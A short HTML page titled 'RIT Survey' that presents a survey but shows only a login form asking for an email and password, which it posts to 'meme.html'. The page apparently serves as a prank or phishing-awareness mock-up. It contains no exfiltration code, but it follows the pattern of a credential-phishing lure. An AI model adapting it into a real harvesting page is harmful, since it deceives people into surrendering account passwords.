
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RIT Survey</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, #0056b3, #00b3ff);
            color: white;
            text-align: center;
        }
        h1 {
            margin-top: 50px;
            font-size: 2.5rem;
        }
        form {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            display: inline-block;
            margin-top: 30px;
        }
        input[type="email"], input[type="password"] {
            padding: 10px;
            width: 300px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            outline: none;
        }
        button {
            padding: 10px 20px;
            background: #0056b3;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 1rem;
            cursor: pointer;
        }
        button:hover {
            background: #003d80;
        }
        .container {
            margin-top: 50px;
        }
    </style>
</head>
<body>
    <h1>Welcome to RIT Survey</h1>
    <div class="container">
        <form action="meme.html" method="POST">
            <input type="email" name="email" placeholder="Enter your Email" required>
            <br>
            <input type="password" name="password" placeholder="Enter your Password" required>
            <br>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
